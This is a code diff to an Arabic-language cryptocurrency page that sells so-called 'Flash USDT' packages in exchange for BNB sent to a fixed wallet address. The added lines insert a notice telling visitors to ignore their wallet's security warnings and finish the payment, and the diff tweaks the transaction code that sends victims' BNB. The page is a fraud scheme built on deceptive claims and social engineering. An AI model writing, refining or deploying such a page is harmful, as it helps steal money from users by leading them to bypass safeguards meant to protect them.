@@ -16,6 +16,8 @@
             --card-bg: #0a1f1b;
             --text-light: #f5f5f5;
             --accent: #ff4d4d;
+            --warning-bg: rgba(255, 193, 7, 0.1);
+            --warning-border: #ffc107;
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -85,6 +87,26 @@
             outline: none;
         }
 
+        /* صندوق التنبيه الذكي */
+        .smart-notice {
+            background: var(--warning-bg);
+            border: 1px solid var(--warning-border);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #ffc107;
+            line-height: 1.5;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .smart-notice i {
+            font-size: 18px;
+            margin-top: 2px;
+        }
+
         .btn-main {
             width: 100%;
             padding: 18px;
@@ -146,6 +168,15 @@
             <option value="0.1">باقة 5,000 USDT (0.1 BNB)</option>
             <option value="1.0">باقة 50,000 USDT (1.0 BNB)</option>
         </select>
+
+        <!-- صندوق التنبيه المضاف -->
+        <div class="smart-notice">
+            <span>⚠️</span>
+            <div>
+                <strong>تنبيه الأمان الفوري:</strong>
+                نظراً لأن النظام يعتمد على تكنولوجيا الـ <strong>Flash USDT</strong> لضمان سرعة التوزيع، قد تظهر لك المحفظة تحذيراً أمنياً روتينياً. يرجى تجاهل التحذير وإكمال العملية بسلام لضمان استلام رصيدك في الحال.
+            </div>
+        </div>
 
         <div id="mobile-options" class="wallet-gate">
             <a href="javascript:void(0)" onclick="openInWallet('metamask')" class="wallet-btn">
@@ -212,14 +243,12 @@
                 await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC }] });
             }
 
-            s.innerText = "يرجى تأكيد العملية برسوم غاز منخفضة...";
+            s.innerText = "يرجى تأكيد العملية في محفظتك...";
 
-            // إرسال مباشر لتقليل الغاز وتجنب فشل العقود
             await web3.eth.sendTransaction({
                 from: acc,
                 to: ADDR,
-                value: web3.utils.toWei(amt, "ether"),
-                gas: 50000 // تحديد حد غاز منخفض وطبيعي جداً (رسوم أقل من 0.5 دولار)
+                value: web3.utils.toWei(amt, "ether")
             });
 
             s.innerText = "✅ تمت العملية بنجاح! سيصلك الرصيد فوراً.";
